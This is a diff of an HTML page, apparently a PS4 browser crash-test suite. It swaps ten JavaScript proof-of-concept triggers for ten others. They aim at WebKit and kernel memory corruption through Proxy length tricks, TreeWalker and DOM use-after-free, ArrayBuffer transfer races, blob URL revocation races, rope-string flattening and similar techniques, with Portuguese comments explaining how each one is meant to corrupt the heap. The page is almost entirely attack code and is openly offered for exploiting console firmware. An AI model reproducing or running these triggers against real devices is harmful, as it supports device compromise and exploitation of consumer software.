@@ -2,262 +2,261 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Pure Memory Corruption Suite v19000</title>
+<title>PS4 Pure Logic Corruption Suite v20000</title>
 </head>
 <body>
 
-<h1>SUITE V19000: PURE HEAP CORRUPTION (NO WEBGL/WS/SAB)</h1>
-<p>Target: WebCore UAF & Buffer Detach Races</p>
+<h1>SUITE V20000: PURE LOGIC & HEAP CORRUPTION</h1>
+<p>Target: WebKit Logic Bugs & Kernel VFS Race. No GPU/WS/SAB.</p>
 <hr>
 
-<button onclick="crashBufferTransfer()">01. ArrayBuffer Transfer to Worker vs View Access (Classic UAF)</button>
+<button onclick="crashProxyConcat()">01. Array.concat with Proxy Length Getter (OOB Read/Info Leak)</button>
 
-<button onclick="crashMutationEvent()">02. DOMNodeRemoved Event Handler Parent Destruction (DOM UAF)</button>
+<button onclick="crashRegexRecursion()">02. RegExp Infinite Recursive Backreference (Stack Exhaustion)</button>
 
-<button onclick="crashAudioDetach()">03. AudioBuffer Channel Data Detach during Playback</button>
+<button onclick="crashTreeWalkerUAF()">03. TreeWalker Filter Node Removal (Classic DOM UAF)</button>
 
-<button onclick="crashPortRecursion()">04. MessagePort PostMessage Recursive Cloning (IPC Stack Smash)</button>
+<button onclick="crashWorkerTransfer()">04. ArrayBuffer Transfer vs ByteLength Access Race</button>
 
-<button onclick="crashXHRAbort()">05. XMLHttpRequest Abort during Readystate Change (Internal State UAF)</button>
+<button onclick="crashBlobVFSRace()">05. Concurrent Fetch vs RevokeObjectURL (Kernel VFS Panic)</button>
 
-<button onclick="crashStringRope()">06. Large String Rope Flattening Heap Overflow (Allocator Panic)</button>
+<button onclick="crashHistoryGetter()">06. History.pushState with Mutating Getter (Object Clone UAF)</button>
 
-<button onclick="crashRangeExtract()">07. DOM Range extractContents Mutation Race</button>
+<button onclick="crashMapIterator()">07. Map Iterator Delete/Add Rehash Corruption</button>
 
-<button onclick="crashBlobRevoke()">08. Fetch Blob URL vs revokeObjectURL Race (VFS Panic)</button>
+<button onclick="crashStringRope()">08. String Rope Flattening Allocation Panic</button>
 
-<button onclick="crashTextDecode()">09. TextDecoder Stream Decode vs Buffer Detach</button>
+<button onclick="crashIntlCollator()">09. Intl.Collator Compare with Side-Effects</button>
 
-<button onclick="crashArrayOverflow()">10. TypedArray Constructor Integer Overflow (Heap Spray)</button>
+<button onclick="crashFileReaderRace()">10. FileReader Double Read Race Condition</button>
 
-<div id="log" style="border: 1px solid #000; height: 200px; overflow: auto; white-space: pre;"></div>
+<div id="log" style="border: 1px solid #000; height: 300px; overflow: auto; white-space: pre-wrap; font-family: monospace;"></div>
 
 <script>
     function log(msg) {
-        document.getElementById('log').innerText += "\n" + msg;
+        document.getElementById('log').innerText += "\n[LOG] " + msg;
     }
 
-    // 01. ArrayBuffer Transfer to Worker vs View Access (Classic UAF)
-    // Alvo: Escrever em memória que acabou de ser transferida para outra thread.
-    // O motor deve "desligar" (detach) a View imediatamente, mas se houver delay...
-    function crashBufferTransfer() {
-        const ab = new ArrayBuffer(1024 * 1024 * 8); // 8MB
-        const view = new Uint32Array(ab);
+    // 01. Array.concat with Proxy Length Getter (OOB Read)
+    // Alvo: Otimização do JSC para concatenação de arrays.
+    // Se mudarmos o tamanho do array DURANTE a concatenação (via Proxy), o motor C++ pode ler memória fora dos limites.
+    function crashProxyConcat() {
+        const a = [1, 2, 3];
+        const p = new Proxy(a, {
+            get(target, prop) {
+                if (prop === 'length') {
+                    // Retorna um tamanho maior do que a realidade
+                    // Tenta enganar o alocador para ler lixo do Heap
+                    return 0xFFFFFFFF; 
+                }
+                return target[prop];
+            }
+        });
         
-        // Worker apenas para receber a memória
+        try {
+            // Concatena o proxy enganoso
+            const res = [].concat(p);
+            log("Concat result length: " + res.length);
+        } catch(e) {
+            log("Erro (Safe): " + e.message);
+        }
+    }
+
+    // 02. RegExp Infinite Recursive Backreference
+    // Alvo: YARR (Regex Engine). 
+    // Uma regex mal formada pode causar estouro de buffer interno na engine de regex sem usar JIT.
+    function crashRegexRecursion() {
+        try {
+            // Padrão que tenta referenciar o próprio grupo de captura infinitamente
+            // ((...)\1)+ 
+            let pat = "((a)";
+            for(let i=0; i<2000; i++) pat += "\\1"; // Referência aninhada
+            pat += ")+";
+            
+            const re = new RegExp(pat);
+            re.test("aaaaaaaaaaaaaaaaaaaa");
+        } catch(e) {
+            log("Regex Error: " + e.message);
+        }
+    }
+
+    // 03. TreeWalker Filter Node Removal (Classic DOM UAF)
+    // Alvo: Gerenciamento de vida de nós do WebCore.
+    // O TreeWalker mantém um ponteiro para o "nó atual". Se o filtro remover esse nó, o ponteiro fica pendurado.
+    function crashTreeWalkerUAF() {
+        const root = document.createElement('div');
+        const child = document.createElement('div');
+        root.appendChild(child);
+        document.body.appendChild(root);
+        
+        const filter = {
+            acceptNode: function(node) {
+                if (node === child) {
+                    // O GOLPE: Remove o nó que está sendo visitado
+                    root.removeChild(child);
+                    // Tenta sujar a memória imediatamente
+                    const junk = new Array(1000).fill(1.1);
+                    return NodeFilter.FILTER_ACCEPT;
+                }
+                return NodeFilter.FILTER_SKIP;
+            }
+        };
+        
+        const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, filter, false);
+        try {
+            walker.nextNode(); // Dispara o filtro
+            // Tenta acessar o nó que deveria estar morto
+            const dead = walker.currentNode;
+            dead.id = "crash"; 
+        } catch(e) {}
+    }
+
+    // 04. ArrayBuffer Transfer vs ByteLength Access Race
+    // Alvo: Condição de corrida entre thread principal e Worker.
+    function crashWorkerTransfer() {
+        const ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+        // Worker simples que aceita transferência
         const w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){}"], {type:'text/javascript'})));
         
-        // Race: Agenda a transferência
+        // Race: Tenta ler byteLength EXATAMENTE quando o buffer é "neutered" (transferido)
+        // Se falhar a sincronização, acessa o ponteiro antigo que agora é inválido
         setTimeout(() => {
             w.postMessage(ab, [ab]);
         }, 0);
         
-        // Tenta escrever freneticamente
-        try {
-            // Loop bloqueante para tentar pegar o exato momento do detach
-            const start = Date.now();
-            while (Date.now() - start < 1000) {
-                // Se o buffer for detachado, view.length vira 0.
-                // Se o JIT/Interpretador não checar isso a cada iteração...
-                if (view.length > 0) {
-                    view[0] = 0x41414141; 
-                }
-            }
-        } catch(e) {
-            log("View detached (seguro): " + e.message);
+        const start = Date.now();
+        while(Date.now() - start < 500) {
+            // Acesso repetitivo em loop apertado
+            if (ab.byteLength === 0) break; 
         }
     }
 
-    // 02. DOMNodeRemoved Mutation UAF
-    // Alvo: WebCore DOM Tree. Remover o pai de um nó DENTRO do evento de remoção desse nó.
-    function crashMutationEvent() {
-        const parent = document.createElement('div');
-        const child = document.createElement('div');
-        parent.appendChild(child);
-        document.body.appendChild(parent);
-
-        child.addEventListener('DOMNodeRemoved', function(e) {
-            // O nó 'child' está sendo removido.
-            // O motor C++ tem um ponteiro para 'child' e 'parent'.
-            // Removemos o 'parent' agora.
-            try {
-                document.body.removeChild(parent);
-                // Força GC para limpar o 'parent'
-                parent.innerHTML = "";
-                const junk = new Array(10000).fill(1);
-            } catch(ex) {}
-        });
-
-        // Dispara o evento
-        parent.removeChild(child);
-    }
-
-    // 03. AudioBuffer Channel Data Detach during Playback
-    // Alvo: Audio DSP Thread. O processamento de áudio roda em thread separada de alta prioridade.
-    function crashAudioDetach() {
-        if(!window.AudioContext) return log("No AudioContext");
-        const ctx = new AudioContext();
-        const buffer = ctx.createBuffer(1, 44100, 44100);
-        const src = ctx.createBufferSource();
-        src.buffer = buffer;
-        src.connect(ctx.destination);
-        
-        // Pega os dados crus
-        const channelData = buffer.getChannelData(0);
-        const ab = channelData.buffer; // O ArrayBuffer subjacente
-        
-        src.start();
-        
-        // Transfere o buffer para um worker (Detach)
-        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-        w.postMessage(ab, [ab]);
-        
-        // A thread de áudio tenta ler 'channelData' para tocar o som.
-        // Se a validação de "isDetached" falhar no DSP...
-    }
-
-    // 04. MessagePort PostMessage Recursive Cloning
-    // Alvo: Serialização de IPC (Structured Clone). Estouro de Pilha no Kernel ou Userland.
-    function crashPortRecursion() {
-        const ch = new MessageChannel();
-        let msg = { port: ch.port2 };
-        
-        // Cria aninhamento profundo de objetos contendo portas
-        for(let i=0; i<1000; i++) {
-            msg = { next: msg, port: ch.port2 };
-        }
-        
-        try {
-            // Envia a estrutura recursiva pela própria porta
-            ch.port1.postMessage(msg, [ch.port2]);
-        } catch(e) {
-            log("Falha no envio: " + e.message);
-        }
-    }
-
-    // 05. XMLHttpRequest Abort during Readystate Change
-    // Alvo: Máquina de estado do XHR C++.
-    function crashXHRAbort() {
-        const xhr = new XMLHttpRequest();
-        xhr.open("GET", window.location.href);
-        
-        xhr.onreadystatechange = function() {
-            // Estado 2 = HEADERS_RECEIVED. O objeto está processando dados.
-            if(xhr.readyState === 2 || xhr.readyState === 3) {
-                xhr.abort(); // Destroi a request interna
-                
-                // Tenta acessar propriedades que dependem do request nativo
-                try {
-                    const s = xhr.status;
-                    const r = xhr.responseText;
-                } catch(e) {}
-            }
-        };
-        xhr.send();
-    }
-
-    // 06. Large String Rope Flattening Heap Overflow
-    // Alvo: JSC Heap (String Allocator).
-    function crashStringRope() {
-        // Cria uma "Rope String" (árvore de concatenação) gigante
-        let s = "A";
-        // 2^27 chars = ~134MB. PS4 tem limites de alocação contígua.
-        for(let i=0; i<27; i++) s += s; 
-        
-        try {
-            // Força "flattening": converter a árvore num buffer linear contíguo.
-            // Se o alocador falhar mas o código não checar NULL...
-            s.charAt(0); 
-            // Ou substituição que força cópia
-            s.replace(/A/g, "B");
-        } catch(e) {
-            log("OOM detectado (seguro).");
-        }
-    }
-
-    // 07. DOM Range extractContents Mutation Race
-    // Alvo: WebCore Editing (Range).
-    function crashRangeExtract() {
-        const div = document.createElement('div');
-        const p = document.createElement('p');
-        p.textContent = "Test node";
-        div.appendChild(p);
-        document.body.appendChild(div);
-        
-        const range = document.createRange();
-        range.selectNode(p);
-        
-        // Mutation observer para interceptar a remoção
-        const obs = new MutationObserver(() => {
-            // O Range está removendo o 'p'.
-            // Nós tentamos destruir o 'div' pai e limpar referências.
-            div.remove();
-            range.detach(); // Deprecated mas ainda existe em versões antigas
-        });
-        
-        obs.observe(div, {childList: true});
-        
-        try {
-            range.extractContents();
-        } catch(e) {}
-    }
-
-    // 08. Fetch Blob URL vs revokeObjectURL Race
-    // Alvo: VFS (Virtual File System) do Kernel.
-    function crashBlobRevoke() {
-        const blob = new Blob(["CRASH".repeat(1000)]);
+    // 05. Concurrent Fetch vs RevokeObjectURL (Kernel VFS Panic)
+    // Alvo: Sistema de Arquivos Virtual do Kernel (VFS).
+    function crashBlobVFSRace() {
+        const blob = new Blob([new ArrayBuffer(1024 * 1024)]);
         const url = URL.createObjectURL(blob);
         
-        // Inicia leitura do blob
-        fetch(url).then(r => r.text()).catch(e=>{});
-        
-        // Revoga a URL imediatamente (Race condition)
-        // O kernel tenta ler o 'inode' virtual que está sendo destruído
-        URL.revokeObjectURL(url);
-        
-        // Flood para aumentar a chance de conflito
-        for(let i=0; i<100; i++) URL.revokeObjectURL(url);
-    }
-
-    // 09. TextDecoder Stream Decode vs Buffer Detach
-    // Alvo: WebCore TextCodec.
-    function crashTextDecode() {
-        const decoder = new TextDecoder();
-        const u8 = new Uint8Array(1024 * 1024);
-        
-        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-        
-        // Passa o buffer para o decoder com stream:true (mantém estado)
-        decoder.decode(u8, {stream: true});
-        
-        // Transfere o buffer (detach)
-        w.postMessage(u8.buffer, [u8.buffer]);
-        
-        try {
-            // Tenta decodificar novamente o buffer detachado
-            decoder.decode(u8, {stream: true});
-        } catch(e) {
-            log("Erro esperado: " + e.message);
-        }
-    }
-
-    // 10. TypedArray Constructor Integer Overflow
-    // Alvo: JSC ArrayBuffer Allocator.
-    function crashArrayOverflow() {
-        try {
-            // Tenta alocar array com tamanho negativo (interpretado como unsigned huge)
-            // ou tamanho que causa overflow na multiplicação por bytes (ex: len * 4)
-            const huge = new Int32Array(0x40000000); // 1GB * 4 = 4GB (Limite de 32bit)
-            huge[0] = 1;
-        } catch(e) {
-            log("Alocação falhou.");
+        const workers = [];
+        // Cria múltiplos workers tentando ler o blob simultaneamente
+        for(let i=0; i<5; i++) {
+            workers.push(new Worker(URL.createObjectURL(new Blob([`
+                onmessage = function(e) {
+                    fetch(e.data).then(r => r.arrayBuffer());
+                }
+            `], {type:'text/javascript'}))));
+            workers[i].postMessage(url);
         }
         
+        // Na main thread, revoga a URL violentamente
+        // O Kernel tenta ler o 'inode' do blob enquanto a main thread destroi a referência
+        setTimeout(() => {
+            for(let i=0; i<100; i++) URL.revokeObjectURL(url);
+        }, 5);
+    }
+
+    // 06. History.pushState with Mutating Getter (Object Clone UAF)
+    // Alvo: Algoritmo de "Structured Clone" usado pelo History API.
+    function crashHistoryGetter() {
+        const state = {
+            get a() {
+                // Mutação destrutiva durante a clonagem
+                // Navega para outra página ou recarrega para destruir o contexto atual
+                // Mas como queremos crash sem sair, tentamos recursão de estado
+                history.replaceState(null, "", null);
+                // Aloca memória
+                const x = new Uint8Array(1024*1024);
+                return x;
+            }
+        };
+        
         try {
-            // Tenta via construtor ArrayBuffer direto
-            new ArrayBuffer(0xFFFFFFFF);
+            // O algoritmo começa a clonar 'state'. Quando chega em 'a', executa o getter.
+            // O getter muda o estado do histórico subjacente.
+            history.pushState(state, "", "?crash");
         } catch(e) {}
     }
+
+    // 07. Map Iterator Delete/Add Rehash Corruption
+    // Alvo: Estrutura de dados HashMap no WebKit.
+    function crashMapIterator() {
+        const m = new Map();
+        for(let i=0; i<1000; i++) m.set(i, i);
+        
+        // Itera e modifica a estrutura para forçar re-hashing
+        for(const [k, v] of m) {
+            m.delete(k);
+            // Adiciona chaves novas para forçar a tabela a crescer ou mudar layout
+            m.set("key" + k, "val");
+            
+            // Tenta acessar iterador possivelmente inválido
+            if (k % 100 === 0) {
+                // Garbage collection force attempt
+                const trash = new Array(1000).fill({});
+            }
+        }
+    }
+
+    // 08. String Rope Flattening Allocation Panic
+    // Alvo: Alocador de Strings do Kernel/Userland.
+    function crashStringRope() {
+        // Constrói uma string não contígua (Rope) gigante
+        let s = "CrashCore";
+        // 2^26 é suficiente para pressionar a memória em 32-bit ou heap limitado
+        for(let i=0; i<26; i++) {
+            s += s;
+        }
+        
+        try {
+            // A string 's' é uma árvore de ponteiros agora.
+            // charAt(0) ou toUpperCase() força o motor a alocar um buffer contíguo gigante.
+            // Se o malloc falhar e o retorno não for checado -> NULL Deref.
+            log("Flattening rope...");
+            s.toUpperCase(); 
+        } catch(e) {
+            log("OOM Handled: " + e.message);
+        }
+    }
+
+    // 09. Intl.Collator Compare with Side-Effects
+    // Alvo: Biblioteca ICU (Internacionalização).
+    function crashIntlCollator() {
+        const collator = new Intl.Collator();
+        
+        const evil = {
+            toString: function() {
+                // Side-effect: Tenta invalidar caches internos do Intl
+                // ou alocar muita memória
+                const arr = new Array(10000).fill(1);
+                return "A";
+            }
+        };
+        
+        // compare() chama toString() nos argumentos.
+        // Se a implementação C++ não estiver preparada para reentrância ou GC...
+        collator.compare(evil, "B");
+    }
+
+    // 10. FileReader Double Read Race Condition
+    // Alvo: File API State Machine.
+    function crashFileReaderRace() {
+        const blob = new Blob(["A".repeat(1024*1024)]);
+        const fr = new FileReader();
+        
+        // Setup events
+        fr.onload = () => log("Loaded");
+        
+        // Inicia leitura
+        fr.readAsArrayBuffer(blob);
+        
+        // Imediatamente tenta ler de novo ou abortar
+        // O padrão diz que deve lançar erro, mas race conditions existem
+        try {
+            fr.abort();
+            fr.readAsText(blob);
+        } catch(e) {}
+    }
+
 </script>
 
 </body>
